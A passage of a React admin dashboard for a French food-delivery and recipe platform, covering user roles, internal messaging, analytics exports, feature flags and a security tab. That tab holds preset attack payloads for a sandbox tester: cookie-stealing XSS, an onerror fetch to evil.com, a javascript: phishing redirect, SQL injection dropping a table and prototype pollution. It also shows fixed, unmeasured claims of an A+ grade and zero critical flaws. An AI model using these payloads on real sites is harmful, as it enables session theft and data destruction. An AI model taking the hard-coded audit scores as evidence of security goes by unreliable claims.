                                <td className="py-3 px-3 text-slate-600">
                                  <div className="space-y-0.5">
                                    <span className="block truncate max-w-[160px]">{user.email}</span>
                                    <span className="text-[11px] text-slate-500">{user.countryFlag} {user.country}</span>
                                  </div>
                                </td>

                                <td className="py-3 px-3">
                                  {/* Role Selector Dropdown */}
                                  <select
                                    value={user.role}
                                    disabled={roleUpdatingUserId === user.id || user.id === currentUser.id}
                                    title={user.id === currentUser.id ? 'Vous ne pouvez pas modifier votre propre rôle' : undefined}
                                    onChange={(e) => handleChangeUserRole(user.id, e.target.value as UserRole)}
                                    className="px-2.5 py-1 rounded-xl bg-slate-100 hover:bg-slate-200 border border-slate-200 text-xs font-black text-slate-800 cursor-pointer focus:outline-none focus:ring-2 focus:ring-[#FF4E27]/30 disabled:opacity-60 disabled:cursor-not-allowed"
                                  >
                                    <option value="admin">🛡️ Administrateur</option>
                                    <option value="member">👤 Membre</option>
                                  </select>
                                </td>

                                <td className="py-3 px-3">
                                  <span className="text-[10px] font-bold text-slate-500 bg-slate-100 px-2 py-0.5 rounded-full inline-block">
                                    {user.role === 'super_admin' && 'Accès Total & Flags'}
                                    {user.role === 'admin' && 'Gestion des recettes & utilisateurs'}
                                    {user.role === 'chef' && 'Création Masterclasses & Recettes'}
                                    {user.role === 'vendor' && 'Gestion Menus & Commandes'}
                                    {user.role === 'driver' && 'Livraison GPS & Pourboires'}
                                    {user.role === 'moderator' && 'Validation Recettes'}
                                    {user.role === 'member' && 'Consultation des recettes publiées'}
                                  </span>
                                </td>

                                <td className="py-3 px-3">
                                  <span className="px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">
                                    Actif
                                  </span>
                                </td>

                                <td className="py-3 px-4 text-right">
                                  <button
                                    type="button"
                                    onClick={() => {
                                      setToastNotice(`Profil de ${user.name} sélectionné pour inspection.`);
                                      setTimeout(() => setToastNotice(null), 3000);
                                    }}
                                    className="p-1.5 rounded-lg hover:bg-slate-200 text-slate-500 hover:text-slate-800"
                                    title="Voir détail"
                                  >
                                    <Eye className="w-3.5 h-3.5" />
                                  </button>
                                </td>
                              </tr>
                            ))}
                        </tbody>
                      </table>
                    </div>
                  </div>

                </div>
              )}

              {/* ========================================================== */}
              {/* TAB 4: MESSAGERIE INTERNE (Une messagerie interne)         */}
              {/* ========================================================== */}
              {activeTab === 'messaging' && (
                <div className="bg-white rounded-3xl border border-slate-200 shadow-xs overflow-hidden h-[600px] flex flex-col md:flex-row">
                  
                  {/* Left Conversations List */}
                  <div className="w-full md:w-80 border-r border-slate-200 flex flex-col bg-slate-50/50 shrink-0">
                    <div className="p-4 border-b border-slate-200 space-y-3">
                      <div className="flex items-center justify-between">
                        <h3 className="font-serif font-black text-sm text-slate-900">
                          Messagerie Interne
                        </h3>
                        <span className="px-2 py-0.5 rounded-full bg-[#FF4E27] text-white text-[10px] font-bold">
                          Admin Hub
                        </span>
                      </div>

                      {/* Channels Category Switcher */}
                      <div className="flex items-center gap-1 overflow-x-auto pb-1 text-[11px] font-bold">
                        {[
                          { id: 'all', label: 'Tous' },
                          { id: 'support', label: 'Support' },
                          { id: 'chefs', label: 'Chefs' },
                          { id: 'drivers', label: 'Livreurs' },
                          { id: 'staff', label: 'Staff' }
                        ].map(c => (
                          <button
                            key={c.id}
                            type="button"
                            onClick={() => setActiveConvCategory(c.id as any)}
                            className={`px-2 py-1 rounded-lg transition-all ${
                              activeConvCategory === c.id ? 'bg-slate-900 text-white' : 'text-slate-600 hover:bg-slate-200/60'
                            }`}
                          >
                            {c.label}
                          </button>
                        ))}
                      </div>
                    </div>

                    {/* Conversations List */}
                    <div className="flex-1 overflow-y-auto divide-y divide-slate-100">
                      {conversations
                        .filter(c => activeConvCategory === 'all' || c.category === activeConvCategory)
                        .map(conv => (
                          <div
                            key={conv.id}
                            onClick={() => setActiveConvId(conv.id)}
                            className={`p-3.5 transition-all cursor-pointer flex items-start gap-3 ${
                              activeConvId === conv.id ? 'bg-orange-50/80 border-l-4 border-[#FF4E27]' : 'hover:bg-slate-100/60'
                            }`}
                          >
                            <div className="relative shrink-0">
                              <img
                                src={conv.contactAvatar}
                                alt={conv.contactName}
                                className="w-10 h-10 rounded-full object-cover ring-2 ring-slate-200"
                              />
                              {conv.isOnline && (
                                <span className="absolute bottom-0 right-0 w-2.5 h-2.5 rounded-full bg-emerald-500 ring-1 ring-white" />
                              )}
                            </div>

                            <div className="flex-1 min-w-0 space-y-0.5">
                              <div className="flex items-center justify-between">
                                <span className="font-bold text-xs text-slate-900 truncate block">
                                  {conv.contactName}
                                </span>
                                <span className="text-[10px] text-slate-400 font-mono">
                                  {conv.lastMessageTime}
                                </span>
                              </div>
                              <p className="text-[11px] text-slate-500 truncate">
                                {conv.lastMessage}
                              </p>
                            </div>

                            {conv.unreadCount > 0 && (
                              <span className="w-4 h-4 rounded-full bg-[#FF4E27] text-white text-[9px] font-black flex items-center justify-center shrink-0">
                                {conv.unreadCount}
                              </span>
                            )}
                          </div>
                        ))}
                    </div>

                  </div>

                  {/* Right Chat Stream */}
                  {(() => {
                    const currentConv = conversations.find(c => c.id === activeConvId) || conversations[0];
                    const activeMessages = messagesData[currentConv.id] || [];

                    return (
                      <div className="flex-1 flex flex-col justify-between bg-white overflow-hidden">
                        
                        {/* Chat Header */}
                        <div className="px-5 py-3 border-b border-slate-200 flex items-center justify-between shrink-0 bg-slate-50/30">
                          <div className="flex items-center gap-3">
                            <img
                              src={currentConv.contactAvatar}
                              alt={currentConv.contactName}
                              className="w-9 h-9 rounded-full object-cover ring-2 ring-slate-200"
                            />
                            <div>
                              <h4 className="font-bold text-xs text-slate-900">
                                {currentConv.contactName}
                              </h4>
                              <span className="text-[10px] text-emerald-600 font-bold flex items-center gap-1">
                                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                                En ligne · Canal crypté Afrodelicious
                              </span>
                            </div>
                          </div>

                          <span className="px-2.5 py-1 rounded-xl bg-slate-100 text-slate-700 text-xs font-mono font-bold">
                            #{currentConv.category}
                          </span>
                        </div>

                        {/* Messages Stream */}
                        <div className="flex-1 p-5 overflow-y-auto space-y-3 bg-[#FAF9F6]">
                          {activeMessages.map(msg => {
                            const isMe = msg.senderRole === 'super_admin' || msg.senderId === currentUser.id;
                            return (
                              <div
                                key={msg.id}
                                className={`flex items-start gap-2.5 ${isMe ? 'flex-row-reverse' : ''}`}
                              >
                                <img
                                  src={msg.senderAvatar}
                                  alt={msg.senderName}
                                  className="w-7 h-7 rounded-full object-cover shrink-0 ring-1 ring-slate-200"
                                />
                                <div className={`max-w-[70%] p-3 rounded-2xl text-xs space-y-1 ${
                                  isMe 
                                    ? 'bg-[#FF4E27] text-white rounded-tr-none shadow-sm' 
                                    : 'bg-white text-slate-800 border border-slate-200 rounded-tl-none shadow-2xs'
                                }`}>
                                  <div className="flex items-center justify-between gap-3 text-[10px] opacity-80">
                                    <span className="font-bold">{msg.senderName}</span>
                                    <span>{msg.timestamp}</span>
                                  </div>
                                  <p className="leading-relaxed">{msg.content}</p>
                                  {msg.attachmentName && (
                                    <div className="pt-1 flex items-center gap-1.5 text-[10px] font-bold underline">
                                      <Paperclip className="w-3 h-3" />
                                      <span>{msg.attachmentName}</span>
                                    </div>
                                  )}
                                </div>
                              </div>
                            );
                          })}
                        </div>

                        {/* Input Box */}
                        <form onSubmit={handleSendMessage} className="p-3 border-t border-slate-200 bg-white flex items-center gap-2 shrink-0">
                          <input
                            type="text"
                            placeholder="Écrivez un message interne ou une directive..."
                            value={messageInput}
                            onChange={(e) => setMessageInput(e.target.value)}
                            className="flex-1 px-4 py-2.5 rounded-2xl bg-slate-50 border border-slate-200 text-xs text-slate-800 placeholder-slate-400 focus:outline-none focus:border-[#FF4E27]"
                          />
                          <button
                            type="submit"
                            className="p-2.5 rounded-2xl bg-[#FF4E27] hover:bg-[#E03814] text-white transition-all shadow-md active:scale-95"
                          >
                            <Send className="w-4 h-4" />
                          </button>
                        </form>

                      </div>
                    );
                  })()}

                </div>
              )}

              {/* ========================================================== */}
              {/* TAB 5: STATISTIQUES & EXTRACTIONS (Extractions de données) */}
              {/* ========================================================== */}
              {activeTab === 'analytics' && (
                <div className="space-y-6">
                  
                  {/* Top Stats Banner & Extraction Buttons */}
                  <div className="p-6 rounded-3xl bg-gradient-to-r from-slate-900 via-slate-800 to-[#0F3E2E] text-white shadow-xl flex flex-col md:flex-row md:items-center justify-between gap-4">
                    <div>
                      <span className="text-[10px] font-black uppercase tracking-wider text-amber-400 bg-amber-400/20 px-2.5 py-0.5 rounded-full border border-amber-400/30">
                        Export & Reporting Data Hub
                      </span>
                      <h2 className="font-serif font-black text-xl sm:text-2xl text-white mt-1">
                        Statistiques de la Plateforme & Outils d'Extraction
                      </h2>
                      <p className="text-xs text-slate-300">
                        Consultez les métriques globales et extrayez les données aux formats CSV, JSON ou Rapport PDF officiel.
                      </p>
                    </div>

                    {/* Extraction Buttons */}
                    <div className="flex flex-wrap items-center gap-2">
                      <button
                        type="button"
                        onClick={downloadCsvStats}
                        className="px-3.5 py-2 rounded-xl bg-white hover:bg-slate-100 text-slate-900 text-xs font-black shadow-md flex items-center gap-1.5 transition-all active:scale-95"
                        title="Télécharger fichier CSV pour Excel"
                      >
                        <FileDown className="w-4 h-4 text-emerald-600" />
                        <span>Extraire en CSV</span>
                      </button>

                      <button
                        type="button"
                        onClick={downloadJsonStats}
                        className="px-3.5 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-white text-xs font-black border border-slate-700 shadow-md flex items-center gap-1.5 transition-all active:scale-95"
                        title="Télécharger données brutes JSON"
                      >
                        <FileText className="w-4 h-4 text-amber-400" />
                        <span>Extraire en JSON</span>
                      </button>

                      <button
                        type="button"
                        onClick={handleExportPdfReport}
                        className="px-4 py-2 rounded-xl bg-[#FF4E27] hover:bg-[#E03814] text-white text-xs font-black shadow-md flex items-center gap-1.5 transition-all active:scale-95"
                        title="Générer Rapport PDF complet"
                      >
                        <Download className="w-4 h-4" />
                        <span>Rapport PDF</span>
                      </button>
                    </div>
                  </div>

                  {/* 6 Key Metric Cards */}
                  <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3 sm:gap-4">
                    <div className="p-4 rounded-2xl bg-white border border-slate-200/90 shadow-2xs space-y-1">
                      <span className="text-[10px] font-bold text-slate-400 uppercase">Volume Ventes</span>
                      <span className="text-xl font-black text-slate-900 block font-mono">{ADMIN_STATS_DATA.totalRevenue.toFixed(0)} €</span>
                      <span className="text-[10px] text-emerald-600 font-bold">+22.4% vs N-1</span>
                    </div>

                    <div className="p-4 rounded-2xl bg-white border border-slate-200/90 shadow-2xs space-y-1">
                      <span className="text-[10px] font-bold text-slate-400 uppercase">Commissions</span>
                      <span className="text-xl font-black text-[#FF4E27] block font-mono">{ADMIN_STATS_DATA.commissionsEarned.toFixed(0)} €</span>
                      <span className="text-[10px] text-emerald-600 font-bold">12% Taux moyen</span>
                    </div>

                    <div className="p-4 rounded-2xl bg-white border border-slate-200/90 shadow-2xs space-y-1">
                      <span className="text-[10px] font-bold text-slate-400 uppercase">Commandes Repas</span>
                      <span className="text-xl font-black text-slate-900 block font-mono">{ADMIN_STATS_DATA.deliveryOrdersCount}</span>
                      <span className="text-[10px] text-emerald-600 font-bold">Panier {ADMIN_STATS_DATA.averageOrderValue}€</span>
                    </div>

                    <div className="p-4 rounded-2xl bg-white border border-slate-200/90 shadow-2xs space-y-1">
                      <span className="text-[10px] font-bold text-slate-400 uppercase">Utilisateurs</span>
                      <span className="text-xl font-black text-slate-900 block font-mono">{ADMIN_STATS_DATA.activeUsers}</span>
                      <span className="text-[10px] text-emerald-600 font-bold">+14.2% actifs</span>
                    </div>

                    <div className="p-4 rounded-2xl bg-white border border-slate-200/90 shadow-2xs space-y-1">
                      <span className="text-[10px] font-bold text-slate-400 uppercase">Chefs Partenaires</span>
                      <span className="text-xl font-black text-slate-900 block font-mono">{ADMIN_STATS_DATA.registeredChefs}</span>
                      <span className="text-[10px] text-amber-600 font-bold">8 en attente</span>
                    </div>

                    <div className="p-4 rounded-2xl bg-white border border-slate-200/90 shadow-2xs space-y-1">
                      <span className="text-[10px] font-bold text-slate-400 uppercase">Pourboires Versés</span>
                      <span className="text-xl font-black text-emerald-600 block font-mono">{ADMIN_STATS_DATA.driverTipsTotal.toFixed(0)} €</span>
                      <span className="text-[10px] text-slate-400 font-bold">100% Livreurs</span>
                    </div>
                  </div>

                  {/* Terroir Distribution & Monthly Trend Visuals */}
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    
                    {/* Terroir Progress Bars */}
                    <div className="p-5 rounded-3xl bg-white border border-slate-200 shadow-xs space-y-4">
                      <div className="flex items-center justify-between pb-2 border-b border-slate-100">
                        <span className="font-serif font-black text-sm text-slate-900">
                          Ventes & Popularité par Terroir Géographique
                        </span>
                        <span className="text-[11px] text-slate-400 font-mono">5 zones certifiées</span>
                      </div>

                      <div className="space-y-3">
                        {ADMIN_STATS_DATA.salesByTerroir.map((t, i) => (
                          <div key={i} className="space-y-1">
                            <div className="flex items-center justify-between text-xs font-semibold text-slate-800">
                              <span>{t.terroir}</span>
                              <span className="font-mono text-slate-600">{t.revenue.toFixed(0)} € ({t.percentage}%)</span>
                            </div>
                            <div className="w-full h-2.5 rounded-full bg-slate-100 overflow-hidden">
                              <div
                                className="h-full rounded-full bg-gradient-to-r from-[#FF4E27] to-[#F59E0B]"
                                style={{ width: `${t.percentage}%` }}
                              />
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Monthly Trend Table */}
                    <div className="p-5 rounded-3xl bg-white border border-slate-200 shadow-xs space-y-4">
                      <div className="flex items-center justify-between pb-2 border-b border-slate-100">
                        <span className="font-serif font-black text-sm text-slate-900">
                          Évolution Mensuelle Récente (2026)
                        </span>
                        <span className="text-[11px] text-emerald-600 font-bold">Croissance continue</span>
                      </div>

                      <div className="space-y-2">
                        {ADMIN_STATS_DATA.monthlyTrend.map((m, idx) => (
                          <div key={idx} className="p-2.5 rounded-xl bg-slate-50 border border-slate-100 flex items-center justify-between text-xs">
                            <span className="font-bold text-slate-800">{m.month}</span>
                            <span className="text-slate-600 font-mono">{m.orders} commandes</span>
                            <span className="font-bold text-slate-900 font-mono">{m.revenue.toFixed(0)} €</span>
                            <span className="text-[#FF4E27] font-bold font-mono">+{m.commissions.toFixed(0)} € comm.</span>
                          </div>
                        ))}
                      </div>
                    </div>

                  </div>

                  {/* Media Campaigns & Advertising Kit Section */}
                  <div className="p-5 rounded-3xl bg-slate-900 text-white shadow-md flex flex-col md:flex-row md:items-center justify-between gap-4">
                    <div className="space-y-1">
                      <div className="flex items-center gap-2">
                        <Megaphone className="w-4 h-4 text-[#FF4E27]" />
                        <h3 className="font-serif font-black text-sm text-white">
                          Analyses Médias & Kit Publicitaire 2026 (Audience USA, Formats & Vidéo)
                        </h3>
                      </div>
                      <p className="text-xs text-slate-300">
                        Accédez aux KPIs sur 90 jours : 142.8k MAU, 38% USA, CTR par format, taux de sauvegarde et indicateurs vidéo (VCR 68.4%).
                      </p>
                    </div>

                    <div className="flex flex-wrap items-center gap-2 shrink-0">
                      <button
                        type="button"
                        onClick={downloadMediaReportCsv}
                        className="px-3 py-1.5 rounded-xl bg-white/10 hover:bg-white/20 text-white text-xs font-bold border border-white/20 transition-all cursor-pointer"
                        title="Télécharger CSV Media Kit"
                      >
                        CSV Media Kit
                      </button>
                      <button
                        type="button"
                        onClick={downloadMediaReportJson}
                        className="px-3 py-1.5 rounded-xl bg-white/10 hover:bg-white/20 text-white text-xs font-bold border border-white/20 transition-all cursor-pointer"
                        title="Télécharger JSON Media Kit"
                      >
                        JSON Media Kit
                      </button>
                      <button
                        type="button"
                        onClick={() => setActiveTab('media_campaigns')}
                        className="px-3.5 py-1.5 rounded-xl bg-[#FF4E27] hover:bg-[#E03814] text-white text-xs font-black shadow-xs flex items-center gap-1.5 transition-all cursor-pointer"
                      >
                        <span>Voir les Métriques Complètes</span>
                        <ChevronRight className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>

                </div>
              )}

              {/* ========================================================== */}
              {/* TAB: MEDIA CAMPAIGN & ADVERTISING ANALYTICS (KIT MÉDIA)    */}
              {/* ========================================================== */}
              {activeTab === 'media_campaigns' && (
                <MediaCampaignAnalytics onExportPdf={handleExportPdfReport} />
              )}

              {/* ========================================================== */}
              {/* TAB 6: CONTRÔLE FONCTIONNALITÉS (Activation/Désactivation) */}
              {/* ========================================================== */}
              {activeTab === 'feature_flags' && (
                <div className="space-y-6">
                  
                  {/* Banner */}
                  <div className="p-6 rounded-3xl bg-white border border-slate-200 shadow-xs flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                    <div>
                      <div className="flex items-center gap-2">
                        <SlidersHorizontal className="w-5 h-5 text-[#FF4E27]" />
                        <h2 className="font-serif font-black text-lg text-slate-900">
                          Contrôle des Fonctionnalités (Feature Flags en direct)
                        </h2>
                      </div>
                      <p className="text-xs text-slate-500 mt-1">
                        Activez ou désactivez n'importe quelle fonctionnalité de l'application en un clic. Les changements sont répercutés instantanément dans le menu et pour tous les utilisateurs.
                      </p>
                    </div>

                    <div className="flex items-center gap-2">
                      <button
                        type="button"
                        onClick={handleEnableAllFlags}
                        className="px-3.5 py-1.5 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-black shadow-sm transition-all"
                      >
                        ✓ Tout Activer
                      </button>
                    </div>
                  </div>

                  {/* Grid of all platform feature toggles */}
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                    {[
                      {
                        key: 'delivery' as const,
                        title: 'Afrodelicious Delivery Food',
                        desc: 'Commandes en ligne, géolocalisation GPS, coursiers et calcul de panier.',
                        icon: Truck,
                        color: 'bg-orange-500'
                      },
                      {
                        key: 'recommended' as const,
                        title: 'Restaurants Recommandés',
                        desc: 'Section de restaurants recommandés par les utilisateurs et sponsoring payant.',
                        icon: Award,
                        color: 'bg-amber-500'
                      },
                      {
                        key: 'masterclasses' as const,
                        title: 'Masterclasses & Cours en Ligne',
                        desc: 'Formations vidéo des chefs, billetterie et transmission culinaire.',
                        icon: GraduationCap,
                        color: 'bg-emerald-600'
                      },
                      {
                        key: 'experiences' as const,
                        title: 'Expériences & Tables d\'Hôtes',
                        desc: 'Dîners immersifs, ateliers en petit comité et dégustations.',
                        icon: Utensils,
                        color: 'bg-purple-600'
                      },
                      {
                        key: 'stories' as const,
                        title: 'Stories Vidéo en Direct',
                        desc: 'Diffusion éphémère 24h, vidéos coulisses de chefs et réactions.',
                        icon: Flame,
                        color: 'bg-rose-500'
                      },
                      {
                        key: 'planner' as const,
                        title: 'Planificateur de Repas (Meal Planner)',
                        desc: 'Organisation de la semaine, calcul nutritionnel et calendrier.',
                        icon: CalendarDays,
                        color: 'bg-blue-600'
                      },
                      {
                        key: 'grocery' as const,
                        title: 'Liste de Courses & Épiceries',
                        desc: 'Génération automatique de la liste d\'ingrédients à acheter.',
                        icon: ShoppingBag,
                        color: 'bg-teal-600'
                      },
                      {
                        key: 'savedRecipes' as const,
                        title: 'Recettes Sauvegardées (Recipe Box)',
                        desc: 'Favoris de l\'utilisateur, dossiers et collections personnelles.',
                        icon: Bookmark,
                        color: 'bg-amber-600'
                      },
                      {
                        key: 'driverTips' as const,
                        title: 'Pourboires Livreurs (Tips for drivers)',
                        desc: 'Option de pourboire 100% reversé au coursier dans l\'historique.',
                        icon: Heart,
                        color: 'bg-emerald-500'
                      },
                      {
                        key: 'pdfInvoices' as const,
                        title: 'Facturation PDF Téléchargeable',
                        desc: 'Génération de factures officielles au format PDF avec détail TVA.',
                        icon: FileText,
                        color: 'bg-slate-700'
                      },
                      {
                        key: 'foodCamera' as const,
                        title: 'Scan Caméra IA (Food Lens)',
                        desc: 'Reconnaissance d\'ingrédients par photo et suggestion de plats.',
                        icon: Sparkles,
                        color: 'bg-indigo-600'
                      },
                      {
                        key: 'referrals' as const,
                        title: 'Programme de Parrainage & Gains',
                        desc: 'Codes ambassadeurs, parrainage WhatsApp et réductions -20%.',
                        icon: Share2,
                        color: 'bg-pink-600'
                      },
                      {
                        key: 'tableBooking' as const,
                        title: 'Réservation de Tables Restaurant',
                        desc: 'Prise de rendez-vous et réservation de table directement dans l\'app.',
                        icon: Store,
                        color: 'bg-cyan-600'
                      }
                    ].map(f => {
                      const isEnabled = activeFeatureFlags[f.key] !== false;
                      const Icon = f.icon;

                      return (
                        <div
                          key={f.key}
                          className={`p-5 rounded-3xl border transition-all flex flex-col justify-between space-y-4 ${
                            isEnabled 
                              ? 'bg-white border-slate-200 shadow-xs' 
                              : 'bg-slate-50/80 border-slate-200 opacity-60'
                          }`}
                        >
                          <div className="space-y-2">
                            <div className="flex items-center justify-between">
                              <div className={`w-8 h-8 rounded-xl ${f.color} text-white flex items-center justify-center font-bold shadow-xs`}>
                                <Icon className="w-4 h-4" />
                              </div>
                              <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-black uppercase tracking-wider ${
                                isEnabled ? 'bg-emerald-100 text-emerald-800' : 'bg-slate-200 text-slate-600'
                              }`}>
                                {isEnabled ? 'Actif' : 'Désactivé'}
                              </span>
                            </div>

                            <h4 className="font-bold text-sm text-slate-900">
                              {f.title}
                            </h4>
                            <p className="text-xs text-slate-500 leading-relaxed">
                              {f.desc}
                            </p>
                          </div>

                          {/* Toggle Switch */}
                          <div className="pt-2 border-t border-slate-100 flex items-center justify-between">
                            <span className="text-xs font-bold text-slate-700">
                              {isEnabled ? 'Activé dans l\'application' : 'Désactivé'}
                            </span>
                            <button
                              type="button"
                              onClick={() => handleToggleFlag(f.key, !isEnabled)}
                              className={`w-12 h-6 flex items-center rounded-full p-1 transition-colors cursor-pointer ${
                                isEnabled ? 'bg-[#FF4E27]' : 'bg-slate-300'
                              }`}
                            >
                              <div
                                className={`bg-white w-4 h-4 rounded-full shadow-md transform transition-transform ${
                                  isEnabled ? 'translate-x-6' : 'translate-x-0'
                                }`}
                              />
                            </button>
                          </div>
                        </div>
                      );
                    })}
                  </div>

                </div>
              )}

              {/* ========================================================== */}
              {/* TAB: SECURITY & PENTEST AUDIT (HACKER SHIELD)              */}
              {/* ========================================================== */}
              {activeTab === 'security_audit' && (
                <div className="space-y-6">
                  {/* Security Score Hero Banner */}
                  <div className="p-6 rounded-3xl bg-gradient-to-br from-slate-950 via-slate-900 to-emerald-950 text-white border border-emerald-900/60 shadow-xl relative overflow-hidden">
                    <div className="relative z-10 flex flex-col md:flex-row items-start md:items-center justify-between gap-6">
                      <div className="space-y-2 max-w-xl">
                        <div className="flex items-center gap-2">
                          <span className="px-3 py-1 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 text-[11px] font-black uppercase tracking-wider flex items-center gap-1.5">
                            <ShieldCheck className="w-3.5 h-3.5" />
                            <span>Audit Sécurité Réussi · Grade A+</span>
                          </span>
                          <span className="text-xs text-slate-400 font-mono">Conforme OWASP Top 10</span>
                        </div>
                        <h2 className="font-serif font-black text-2xl sm:text-3xl text-white">
                          Bouclier Défensif Afrodelicious
                        </h2>
                        <p className="text-xs text-slate-300 leading-relaxed font-normal">
                          Toutes les surfaces d'attaque (injections XSS, redirection ouverte, pollution de prototype, injection de protocoles et manipulation de prix) ont été auditées, isolées et protégées par des mécanismes stricts d'assainissement.
                        </p>
                      </div>

                      {/* Security Score Gauge */}
                      <div className="p-4 rounded-2xl bg-white/10 backdrop-blur-md border border-white/15 text-center shrink-0 min-w-[150px]">
                        <span className="text-[10px] font-bold text-slate-300 uppercase tracking-wider block">
                          Indice de Résilience
                        </span>
                        <div className="font-mono font-black text-4xl text-emerald-400 mt-1">
                          99.8<span className="text-lg text-emerald-300">%</span>
                        </div>
                        <span className="text-[10px] text-emerald-300 font-semibold flex items-center justify-center gap-1 mt-1">
                          <CheckCircle2 className="w-3.5 h-3.5" />
                          <span>0 faille critique</span>
                        </span>
                      </div>
                    </div>
                  </div>

                  {/* 8 Protection Pillars Matrix */}
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <h3 className="font-serif font-black text-base text-slate-900">
                        Matrice des Protections Actives
                      </h3>
                      <span className="text-xs text-slate-500 font-medium">
                        8 boucliers temps réel
                      </span>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5">
                      {[
                        {
                          title: 'Filtre Anti-XSS',
                          desc: 'Échappement systématique HTML (&lt;, &gt;, &quot;) et neutralisation des balises <script>, <iframe> et onerror.',
                          status: 'Actif · 100%'
                        },
                        {
                          title: 'Anti-Reverse Tabnabbing',
                          desc: 'Forçage automatique de rel="noopener noreferrer" sur tous les liens externes et gestionnaire safeOpenWindow.',
                          status: 'Actif · 100%'
                        },
                        {
                          title: 'Validateur URL & Protocoles',
                          desc: 'Blocage absolu des schémas malveillants javascript:, vbscript:, data:text/html et obfuscations.',
                          status: 'Actif · 100%'
                        },
                        {
                          title: 'Anti-Prototype Pollution',
                          desc: 'Désérialisation sécurisée avec détection et rejet des clés __proto__, constructor et prototype.',
                          status: 'Actif · 100%'
                        },
                        {
                          title: 'Rate Limiter Anti-Spam',
                          desc: 'Limiteur dynamique à jetons empêchant le spamming de likes, pourboires, partages et abonnements.',
                          status: 'Actif · 100%'
                        },
                        {
                          title: 'Masquage Données & PII',
                          desc: 'Chiffrement visuel des numéros de carte bancaire (•••• 4242), IBANs, e-mails et pourboires.',
                          status: 'Actif · 100%'
                        },
                        {
                          title: 'Contrôle d\'Accès RBAC',
                          desc: 'Barrière d\'autorisation empêchant l\'escalade de privilèges entre membres, chefs et super-administrateur.',
                          status: 'Actif · 100%'
                        },
                        {
                          title: 'Anti-DoS & Clamping',
                          desc: 'Limitation de taille des requêtes et clamping numérique strict évitant les montants négatifs ou NaN.',
                          status: 'Actif · 100%'
                        }
                      ].map((item, idx) => (
                        <div
                          key={idx}
                          className="p-4 rounded-2xl bg-white border border-slate-200/90 shadow-2xs space-y-2 flex flex-col justify-between"
                        >
                          <div>
                            <div className="flex items-center justify-between mb-1">
                              <span className="font-bold text-xs text-slate-900">
                                {item.title}
                              </span>
                              <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                            </div>
                            <p className="text-[11px] text-slate-500 leading-relaxed font-normal">
                              {item.desc}
                            </p>
                          </div>
                          <div className="pt-2 border-t border-slate-100 flex items-center justify-between text-[10px] font-bold text-emerald-700">
                            <span>{item.status}</span>
                            <CheckCircle2 className="w-3.5 h-3.5" />
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Hacker Pentest Simulator (Interactive Sandbox) */}
                  <div className="p-6 rounded-3xl bg-slate-900 text-white border border-slate-800 shadow-xl space-y-4">
                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                      <div>
                        <div className="flex items-center gap-2">
                          <span className="px-2 py-0.5 rounded-md bg-rose-500/20 text-rose-400 font-mono text-[10px] font-bold uppercase tracking-wider">
                            Sandbox Pentest
                          </span>
                          <h3 className="font-serif font-black text-lg text-white">
                            Simulateur d'Attaques & Test d'Injection en Direct
                          </h3>
                        </div>
                        <p className="text-xs text-slate-400 mt-0.5">
                          Injectez des payloads de hacker réels pour constater la neutralisation immédiate par le moteur Afrodelicious.
                        </p>
                      </div>

                      <span className="text-[11px] text-slate-400 font-mono">
                        Moteur de détection heuristique
                      </span>
                    </div>

                    {/* Quick Payload Presets */}
                    <div className="flex flex-wrap items-center gap-2 pt-1">
                      <span className="text-xs text-slate-400 font-medium">Payloads prêts au test :</span>
                      {[
                        { label: 'XSS <script>', payload: '<script>alert("Cookie: "+document.cookie)</script>' },
                        { label: 'XSS <img>', payload: '<img src=x onerror="fetch(\'//evil.com\')">' },
                        { label: 'URL javascript:', payload: 'javascript:window.location="https://fake-phishing.com"' },
                        { label: 'SQL Injection', payload: "' OR 1=1 -- DROP TABLE users;" },
                        { label: 'Prototype Pollution', payload: '{"__proto__": {"role": "admin"}}' },
                        { label: 'Montant négatif', payload: 'Tip: -500.00 € (Inversion de solde)' },
                      ].map((preset, i) => (
                        <button
                          key={i}
                          type="button"
                          onClick={() => {
                            setPentestInput(preset.payload);
                            runPentestCheck(preset.payload);
                          }}
                          className="px-2.5 py-1 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-[11px] font-mono transition-colors border border-slate-700"
                        >
                          {preset.label}
                        </button>
                      ))}
                    </div>

                    {/* Input Console */}
                    <div className="space-y-2">
                      <div className="flex items-center gap-2 bg-slate-950 p-3 rounded-2xl border border-slate-800">
                        <span className="text-slate-500 font-mono text-xs select-none">$</span>
                        <input
                          type="text"
                          value={pentestInput}
                          onChange={(e) => setPentestInput(e.target.value)}
                          placeholder="Entrez un payload malveillant..."
                          className="flex-1 bg-transparent text-xs text-emerald-400 font-mono outline-none"
                        />
                        <button
                          type="button"
                          onClick={() => runPentestCheck(pentestInput)}
                          className="px-4 py-2 rounded-xl bg-[#FF4E27] hover:bg-[#E03814] text-white text-xs font-bold transition-all shrink-0 active:scale-95"
                        >
                          Tester la défense
                        </button>
                      </div>
                    </div>

                    {/* Pentest Report Card */}
                    {activeThreatReport && (
                      <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-3 animate-in fade-in">
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-2">
                            {activeThreatReport.isThreat ? (
                              <span className="px-2.5 py-0.5 rounded-full bg-rose-500/20 text-rose-400 text-xs font-bold font-mono flex items-center gap-1.5 border border-rose-500/30">
                                🛡️ MENACE DÉTECTÉE ({activeThreatReport.threatType}) · {activeThreatReport.severity}
                              </span>
                            ) : (
